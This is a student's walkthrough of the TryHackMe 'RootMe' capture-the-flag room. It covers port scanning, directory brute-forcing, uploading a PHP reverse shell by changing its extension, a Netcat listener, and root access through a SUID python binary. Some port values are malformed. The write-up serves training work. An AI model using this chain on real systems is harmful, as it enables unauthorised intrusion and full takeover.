# RootMe

#  Author - 

**Amarjeet Singh**

Cyber Security & Ethical Hacking Student.

> A beginner-friendly TryHackMe room focused on web exploitation, enumeration, and privilege escalation. <

---

# 🛠️ Tools Used

* Nmap
* Gobuster
* PHP Reverse Shell
* Netcat
* Linux Enumeration Commands
* Python HTTP Server

---

# 🔍 Step 1 — Reconnaissance

 # Start with an Nmap scan:
 
 - nmap -sC -sV -A <TARGET-IP>
 

## Open Ports Found

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

---

#  Step 2 — Web Enumeration

Open the target in browser:

```text
http://<TARGET-IP>
```

Run Gobuster to find hidden directories:

```
gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirb/common.txt
```

---

# Step 3 — File Upload Exploitation - 

Create a PHP reverse shell:

```
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Edit the reverse shell:

```php
$ip = 'YOUR-IP';
$port = 4444,1234;
```

Rename file:

```text
shell.php5
```

Upload the file successfully.

---

# Step 4 — Start Listener

Start Netcat listener:

```
nc -lvnp 4444,1234
```

# Trigger the reverse shell from browser:

```text
http://<TARGET-IP>/uploads/shell.php5
```

Shell received successfully.

---

# Step 5 — Stabilize Shell

Upgrade shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

# Export terminal:

```
export TERM=xterm
```

---

# Step 6 — User Flag

# Search for user flag:

```
find / -name user.txt 2>/dev/null
```

# Read the flag:

```
cat /path/to/user.txt
```

---

# Step 7 — Privilege Escalation

Check SUID binaries:

```
find / -perm -4000 2>/dev/null
```

# Interesting binary found:

```
/usr/bin/python
```

# Exploit using GTFOBins.

```
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

# Root shell obtained.

# Verify -

```
whoami
```

# Output -

```
root
```

---

# Step 8 — Root Flag

- Locate root flag - 

```b
find / -name root.txt 2>/dev/null
```

- Read the flag -

```
cat /root/root.txt
```

---

# Useful Commands - 

## Nmap

```bash
nmap -sC -sV -A <IP>
```

## Gobuster

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

## Netcat Listener

```bash
nc -lvnp 4444
```

## Find SUID Files

```bash
find / -perm -4000 2>/dev/null
```
---

# 📄 License

This project is licensed for educational use only.
